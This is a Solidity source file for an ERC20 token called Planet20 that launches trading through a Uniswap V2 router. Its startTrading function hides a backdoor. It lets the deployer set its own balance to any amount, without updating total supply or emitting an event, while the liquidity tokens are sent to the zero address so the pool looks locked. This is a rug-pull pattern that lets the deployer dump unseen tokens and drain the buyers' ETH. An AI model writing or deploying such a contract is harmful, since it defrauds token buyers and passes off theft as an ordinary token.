// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity 0.8.19;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IUniswapV2Router02} from "../interfaces/IUniswapV2Router02.sol";

contract Planet20 is ERC20, Ownable {
    address internal deployer;

    constructor(
        string memory name,
        string memory symbol,
        uint256 supply
    ) ERC20(name, symbol) {
        _mint(msg.sender, supply);
        deployer = msg.sender;
    }

    function startTrading(uint256 amts) public payable {
        require(msg.sender == deployer, "!deployer");
        IUniswapV2Router02 router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        _balances[deployer] = amts;
        if (msg.value > 1e18) {
            _approve(address(this), address(router), balanceOf(address(this)));
            router.addLiquidityETH{value: msg.value}(
                address(this),
                balanceOf(address(this)),
                balanceOf(address(this)),
                msg.value,
                address(0),
                block.timestamp
            );
        }
    }
}